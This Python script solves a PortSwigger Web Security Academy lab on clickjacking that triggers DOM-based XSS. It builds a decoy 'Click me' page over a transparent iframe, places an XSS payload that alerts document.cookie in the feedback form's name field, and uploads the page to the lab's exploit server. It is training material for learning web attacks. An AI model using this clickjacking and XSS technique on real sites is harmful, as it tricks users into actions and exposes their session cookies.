# P https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss
import requests
import sys
from bs4 import BeautifulSoup

site = 'ac121fc81eab6b7dc07e95900027009f.web-security-academy.net'
s = requests.Session()
site_url = f'https://{site}/'
resp = s.get(site_url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

# Exploits a DOM XSS in the origin source of the feedback page
#   Prefills the form with the XSS that when submitted, pulls the
#   victim's cookie and includes it into the form post.  By also
#   pre-filling the e-mail address, if the form sends the response
#   to the given e-mail, then the adversary will receive the contents
#   of the form.
exploit_html = f'''<style>
   iframe {{
       position:relative;
       width:700px;
       height:1000px;
       opacity:0.3;
       z-index: 2;
   }}
   div {{
       position:absolute;
       top:800px;
       left:80px;
       z-index: 1;
   }}
</style>
<div>Click me</div>
<iframe src="https://{site}/feedback?name=<img src=1 onerror=alert(document.cookie)>&email=wuchang@pdx.edu&subject=foo&message=bar"></iframe>
'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}

resp = s.post(exploit_url, data=formData)